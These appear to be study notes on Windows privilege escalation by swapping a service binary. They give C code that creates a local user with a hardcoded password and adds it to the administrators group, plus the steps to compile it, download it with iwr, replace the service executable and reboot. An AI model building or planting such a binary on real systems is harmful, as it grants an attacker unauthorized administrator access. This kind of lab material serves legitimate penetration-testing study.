We need Full access or Modify access to replace the binary in question
For example


lets create a code that will make a new user into a system and put that user in the administrator group

code:
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

The cross compiled version of this code will serve as our malicous binary

we will use mingw-64 to compile our code

we will then trasnfer the cross compiled code to the remote machine
using iwr to download the executable file

after this we just move the binary to our home and then transfer over the malicous binary in its place




in order to execute the binary we will restart the service

how to check the startup type of the service binary in question


Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'ApacheHTTPServer'}

if it is auto, that would mean we can restart the service by rebooting the machine

to check if the user can reboot the machine, we will check if the user has the SeShutDownPrivilege
how do we do this?

whoami /priv  this will list all the privileges of the current user

in our case the current user does have this privelege meaning we reboot

once we do that as our malicous binary instructed, a new user in the admin group would have been created


